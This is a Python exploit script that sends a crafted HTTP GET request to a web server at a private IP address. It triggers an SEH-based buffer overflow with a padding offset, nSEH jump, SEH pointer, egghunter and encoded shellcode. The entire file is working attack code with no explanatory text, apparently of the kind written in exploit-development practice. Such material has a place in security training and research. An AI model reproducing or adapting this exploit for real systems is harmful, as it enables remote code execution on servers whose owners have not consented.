#!/usr/bin/python

import os,sys,struct,socket

host = '192.168.1.28'
port = 80

# bad characters = \x01\x02\x03\x04\x20\x25\x2b

shellcode = ("W00TW00T"
"\x89\xe2\xdd\xc6\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x49\x6c\x68\x68\x4d\x52\x33\x30\x37\x70\x53\x30\x35\x30\x4e"
"\x69\x48\x65\x34\x71\x59\x50\x31\x74\x6c\x4b\x62\x70\x76\x50"
"\x4e\x6b\x71\x42\x36\x6c\x6e\x6b\x71\x42\x62\x34\x4c\x4b\x30"
"\x72\x74\x68\x66\x6f\x6e\x57\x71\x5a\x47\x56\x44\x71\x6b\x4f"
"\x6c\x6c\x65\x6c\x51\x71\x31\x6c\x36\x62\x34\x6c\x47\x50\x49"
"\x51\x4a\x6f\x66\x6d\x47\x71\x69\x57\x78\x62\x49\x62\x61\x42"
"\x46\x37\x4c\x4b\x33\x62\x52\x30\x6e\x6b\x42\x6a\x37\x4c\x4e"
"\x6b\x50\x4c\x32\x31\x33\x48\x79\x73\x70\x48\x77\x71\x48\x51"
"\x42\x71\x4e\x6b\x63\x69\x57\x50\x37\x71\x59\x43\x6c\x4b\x62"
"\x69\x75\x48\x4d\x33\x47\x4a\x63\x79\x4c\x4b\x64\x74\x6c\x4b"
"\x33\x31\x6b\x66\x45\x61\x59\x6f\x6e\x4c\x4f\x31\x78\x4f\x74"
"\x4d\x63\x31\x69\x57\x34\x78\x59\x70\x70\x75\x4b\x46\x35\x53"
"\x53\x4d\x4a\x58\x75\x6b\x61\x6d\x65\x74\x42\x55\x6b\x54\x61"
"\x48\x6e\x6b\x66\x38\x66\x44\x53\x31\x6a\x73\x30\x66\x6e\x6b"
"\x64\x4c\x42\x6b\x6e\x6b\x36\x38\x65\x4c\x53\x31\x68\x53\x4e"
"\x6b\x65\x54\x4c\x4b\x56\x61\x7a\x70\x6e\x69\x51\x54\x35\x74"
"\x77\x54\x33\x6b\x53\x6b\x63\x51\x50\x59\x71\x4a\x46\x31\x6b"
"\x4f\x6d\x30\x63\x6f\x71\x4f\x72\x7a\x6c\x4b\x54\x52\x58\x6b"
"\x4e\x6d\x31\x4d\x52\x4a\x55\x51\x6c\x4d\x4c\x45\x38\x32\x35"
"\x50\x37\x70\x57\x70\x70\x50\x70\x68\x45\x61\x4c\x4b\x42\x4f"
"\x4b\x37\x59\x6f\x58\x55\x6d\x6b\x6d\x30\x55\x4d\x75\x7a\x55"
"\x5a\x53\x58\x49\x36\x6e\x75\x6f\x4d\x6d\x4d\x49\x6f\x6b\x65"
"\x35\x6c\x73\x36\x51\x6c\x34\x4a\x4d\x50\x4b\x4b\x79\x70\x44"
"\x35\x63\x35\x6d\x6b\x31\x57\x52\x33\x64\x32\x52\x4f\x52\x4a"
"\x45\x50\x52\x73\x4b\x4f\x79\x45\x50\x63\x35\x31\x42\x4c\x30"
"\x63\x36\x4e\x31\x75\x31\x68\x55\x35\x33\x30\x41\x41")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

nseh = "\x71\x06\x75\x04"
seh = struct.pack("<I",0x1002483F)

payload = 'A' * (4065 - len(nseh)) # Original offset @ 4065
payload += nseh
payload += seh # 1002483F
payload += "\x90" * 10
payload += egghunter
payload += 'D' * (5000 - len(payload))

request = ("GET /" + payload + " HTTP/1.1\r\n"
"Host: 192.168.1.28\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Connection: close\r\n"
"Upgrade-Insecure-Requests: 1\r\n\r\n"
" " + shellcode + " ")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(request)
sock.close()